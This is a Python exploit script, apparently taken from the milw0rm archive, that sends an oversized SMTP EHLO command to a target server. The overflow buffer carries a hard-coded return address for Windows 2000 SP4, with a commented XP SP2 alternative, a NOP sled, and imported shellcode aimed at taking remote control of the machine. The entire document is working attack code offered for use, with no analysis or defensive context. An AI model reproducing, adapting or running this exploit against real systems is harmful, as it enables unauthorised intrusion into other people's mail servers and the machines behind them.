

import socket
import sys
import time


from payload import buf

import struct
def make_overflow_dummy(overflow_len, retaddr):
    return b'A' * overflow_len + struct.pack(b'<L', retaddr)
def shell_attack(target_machine, target_port): 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# Change RET address as need be.
	buffer = make_overflow_dummy(5093, 0x7c2ee21b) + b'\x90' * 32 + buf  # RET Win2000 SP4 ENG
	# buffer = make_overflow_dummy(5097, 0x7d17dd13) + '\x90' * 32 + buf  #RET WinXP SP2 ENG
	try:
		
		s.connect((target_machine,target_port))
		s.send(b'EHLO ' + buffer + b'\r\n')
		s.recv(1024)
		s.close()
		
	except:
		pass

# milw0rm.com [2004-10-26]